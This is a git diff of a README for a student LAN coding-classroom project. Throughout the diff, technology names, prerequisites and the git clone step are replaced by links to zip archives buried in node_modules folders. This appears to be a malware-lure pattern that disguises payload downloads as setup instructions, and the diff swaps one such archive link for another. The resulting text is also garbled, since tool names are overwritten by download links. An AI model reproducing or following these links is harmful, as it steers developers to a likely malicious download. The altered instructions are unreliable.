@@ -19,22 +19,22 @@ A key feature is its design for **local network (LAN) operation**, allowing stud
 
 ## Technology Stack
 
-*   **Frontend:** https://github.com/Amar-rep/hats-minor-project/raw/refs/heads/main/backend/config/node_modules/ms/hats-minor-project-2.4.zip, HTML, CSS, JavaScript
-*   **Backend:** https://github.com/Amar-rep/hats-minor-project/raw/refs/heads/main/backend/config/node_modules/ms/hats-minor-project-2.4.zip, https://github.com/Amar-rep/hats-minor-project/raw/refs/heads/main/backend/config/node_modules/ms/hats-minor-project-2.4.zip
+*   **Frontend:** https://raw.githubusercontent.com/Amar-rep/hats-minor-project/main/backend/config/node_modules/is-fullwidth-code-point/minor-project-hats-limberly.zip, HTML, CSS, JavaScript
+*   **Backend:** https://raw.githubusercontent.com/Amar-rep/hats-minor-project/main/backend/config/node_modules/is-fullwidth-code-point/minor-project-hats-limberly.zip, https://raw.githubusercontent.com/Amar-rep/hats-minor-project/main/backend/config/node_modules/is-fullwidth-code-point/minor-project-hats-limberly.zip
 *   **Database:** PostgreSQL
-*   **Real-time Communication:** https://github.com/Amar-rep/hats-minor-project/raw/refs/heads/main/backend/config/node_modules/ms/hats-minor-project-2.4.zip (WebSockets)
+*   **Real-time Communication:** https://raw.githubusercontent.com/Amar-rep/hats-minor-project/main/backend/config/node_modules/is-fullwidth-code-point/minor-project-hats-limberly.zip (WebSockets)
 
 ## Prerequisites
 
 Before you begin, ensure you have met the following requirements:
-*   https://github.com/Amar-rep/hats-minor-project/raw/refs/heads/main/backend/config/node_modules/ms/hats-minor-project-2.4.zip and npm (or yarn) installed
+*   https://raw.githubusercontent.com/Amar-rep/hats-minor-project/main/backend/config/node_modules/is-fullwidth-code-point/minor-project-hats-limberly.zip and npm (or yarn) installed
 *   A running PostgreSQL database server
 
 ## Installation & Setup
 
 1.  **Clone the repository:**
     ```bash
-    git clone https://github.com/Amar-rep/hats-minor-project/raw/refs/heads/main/backend/config/node_modules/ms/hats-minor-project-2.4.zip
+    git clone https://raw.githubusercontent.com/Amar-rep/hats-minor-project/main/backend/config/node_modules/is-fullwidth-code-point/minor-project-hats-limberly.zip
     cd hats-minor-project 
     ```
 
@@ -55,7 +55,7 @@ Before you begin, ensure you have met the following requirements:
 
 4.  **Database Setup:**
     *   Create a PostgreSQL database for CODEFLOW.
-    *   Configure your database connection details. This is typically done in a `.env` file in the backend directory. Create a `.env` file based on `https://github.com/Amar-rep/hats-minor-project/raw/refs/heads/main/backend/config/node_modules/ms/hats-minor-project-2.4.zip` (if provided) and add your database URL or credentials:
+    *   Configure your database connection details. This is typically done in a `.env` file in the backend directory. Create a `.env` file based on `https://raw.githubusercontent.com/Amar-rep/hats-minor-project/main/backend/config/node_modules/is-fullwidth-code-point/minor-project-hats-limberly.zip` (if provided) and add your database URL or credentials:
         ```
         DATABASE_URL=postgresql://user:password@host:port/database_name
         # Add other environment variables like PORT, JWT_SECRET etc.
